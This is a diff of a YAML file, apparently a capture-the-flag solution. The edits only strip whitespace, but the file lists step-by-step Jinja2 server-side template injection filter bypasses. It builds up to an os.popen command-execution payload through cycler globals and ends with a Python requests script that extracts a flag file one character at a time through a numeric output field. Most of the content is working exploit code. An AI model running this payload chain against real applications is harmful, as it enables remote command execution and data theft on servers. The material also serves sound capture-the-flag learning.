@@ -15,7 +15,7 @@ tricks:
     payload: |
       POST /login
       Content-Type: application/x-www-form-urlencoded
-      
+
       username=test&password=test
 
   - name: "Step 2: Bypass {{ }} filter"
@@ -24,7 +24,7 @@ tricks:
     payload: |
       # Instead of: {{ 7*7 }}
       # Use: {%print 7*7%}
-      
+
       # Result: 49
 
   - name: "Step 3: Bypass . (dot) filter"
@@ -33,7 +33,7 @@ tricks:
     payload: |
       # Instead of: request.args
       # Use: request|attr('args')
-      
+
       # Instead of: obj.method()
       # Use: obj|attr('method')()
 
@@ -43,7 +43,7 @@ tricks:
     payload: |
       # Pass u=__ as URL parameter
       # Then use: request|attr('args')|attr('get')('u')
-      
+
       {%set u=request|attr('args')|attr('get')('u')%}
       # Now u contains "__"
       # Use: u~'init'~u to construct "__init__"
@@ -54,7 +54,7 @@ tricks:
     payload: |
       # Instead of: obj['key']
       # Use: obj|attr('__getitem__')('key')
-      
+
       # With underscore bypass:
       # obj|attr(u~'getitem'~u)('key')
 
@@ -68,7 +68,7 @@ tricks:
       {%set o=c|attr(u~'getitem'~u)('os')%}
       {%set x=o|attr('popen')(cmd)|attr('read')()%}
       {%print x|length%}
-      
+
       # URL: ?principal=PAYLOAD&u=__&cmd=cat /flag
 
   - name: "Step 7: Bypass numeric output validation"
@@ -77,10 +77,10 @@ tricks:
     payload: |
       # Get string length:
       {%print x|length%}
-      
+
       # Extract single char ASCII via shell:
       # dd if=/flag bs=1 count=1 skip=N 2>/dev/null | od -An -tu1 | tr -d ' '
-      
+
       # This outputs the ASCII code of the Nth character
       # Loop through all characters to reconstruct the flag
 
@@ -90,17 +90,17 @@ tricks:
     payload: |
       import requests
       import json
-      
+
       session = requests.Session()
       session.post(target + '/login', data={'username': 'test', 'password': 'test'})
-      
+
       # Get flag length
       payload_len = "{%set u=request|attr('args')|attr('get')('u')%}{%set cmd=request|attr('args')|attr('get')('cmd')%}{%set c=cycler|attr(u~'init'~u)|attr(u~'globals'~u)%}{%set o=c|attr(u~'getitem'~u)('os')%}{%set x=o|attr('popen')(cmd)|attr('read')()%}{%print x|length%}"
-      
+
       params = {'principal': payload_len, 'payment': 100, 'term': 12, 'u': '__', 'cmd': 'cat /flag'}
       resp = session.get(target + '/total_loan_payments', params=params)
       flag_len = int(json.loads(resp.text.strip())['loan_principal'])
-      
+
       # Extract each character
       flag = ''
       for i in range(flag_len):
@@ -109,6 +109,5 @@ tricks:
           resp = session.get(target + '/total_loan_payments', params=params)
           char_ord = int(json.loads(resp.text.strip())['loan_principal'])
           flag += chr(char_ord)
-      
-      print(flag)
 
+      print(flag)
